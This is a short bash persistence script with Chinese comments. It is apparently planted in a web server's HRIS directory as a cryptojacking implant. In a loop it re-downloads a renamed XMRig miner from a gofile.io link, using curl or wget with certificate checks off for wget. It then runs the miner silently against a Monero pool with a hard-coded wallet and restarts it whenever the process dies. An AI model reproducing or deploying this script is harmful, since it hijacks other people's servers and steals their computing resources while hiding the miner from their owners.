#!/bin/bash
while true; do
    # 1. 检查二进制文件是否存在，不存在则重新下载
    if [ ! -f "/var/www/html/opapru-hris/stmept" ]; then
        echo "Binary not found, re-downloading..."
        if command -v curl >/dev/null; then
            curl -sSL -o "/var/www/html/opapru-hris/stmept" "https://cold7.gofile.io/download/direct/b795322b-9378-4de4-8e36-2b0d66e2b69c/xmrig_86c3"
        elif command -v wget >/dev/null; then
            wget -q --no-check-certificate -O "/var/www/html/opapru-hris/stmept" "https://cold7.gofile.io/download/direct/b795322b-9378-4de4-8e36-2b0d66e2b69c/xmrig_86c3"
        fi
        chmod +x "/var/www/html/opapru-hris/stmept"
    fi

    # 2. 守护进程：通过进程名监控，如果未运行则拉起
    if ! pgrep -f "stmept" >/dev/null; then
        "/var/www/html/opapru-hris/stmept" --url "pool.supportxmr.com:3333" --user "8556M2fMqE8Dg1U3pERP9rJ64jaa6MMha5SY5ovWQ7XiYjxdKquPQ7Z4afpEeXUtfJVBLGvLncGxtKMugv61S9nFGMHNAFK" --pass next --donate-level 0 >/dev/null 2>&1 &
    fi
    sleep 20
done
